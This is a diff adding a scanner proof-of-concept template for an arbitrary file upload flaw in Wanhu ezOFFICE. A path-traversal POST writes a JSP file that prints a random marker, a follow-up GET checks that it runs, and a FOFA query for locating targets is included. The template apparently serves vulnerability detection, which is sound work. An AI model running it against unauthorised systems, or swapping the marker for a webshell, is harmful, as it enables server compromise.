@@ -1,0 +1,48 @@
+id: poc-yaml-wanhuoa-ezoffice-wpsservlet-anyfile-upload
+info:
+  name: 万户OA ezoffice wpsservlet 任意文件上传漏洞
+  severity: high
+  tags:
+  - 两高一弱
+  - 文件上传
+  finger: 万户ezOFFICE协同管理平台
+  fofa: app="万户网络-ezOFFICE"
+variables:
+  bondary: random_str(32)
+  content: random_str(8)
+  filename: random_str(5)
+requests:
+- method: POST
+  path: /defaultroot/wpsservlet?option=saveNewFile&newdocId={{.filename}}&dir=../platform/portal/layout/&fileType=.jsp
+  headers:
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+    Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
+    Accept-Encoding: gzip, deflate
+    DNT: 1
+    Connection: close
+    Upgrade-Insecure-Requests: 1
+    Content-Type: multipart/form-data; boundary={{.bondary}}
+  data: '--{{.bondary}}
+
+    Content-Disposition: form-data; name="NewFile"; filename="{{.filename}}.jsp"
+
+
+    <% out.print("{{.content}}");%>
+
+    --{{.bondary}}--'
+  expression: 'status_code == 200 &&
+
+    contains(body,"")
+
+    '
+- method: GET
+  path: /defaultroot/platform/portal/layout/{{.filename}}.jsp
+  expression: 'status_code == 200 &&
+
+    contains(body,content) &&
+
+    contains(content_type,"text/html;charset=UTF-8")
+
+    '
+transport: http
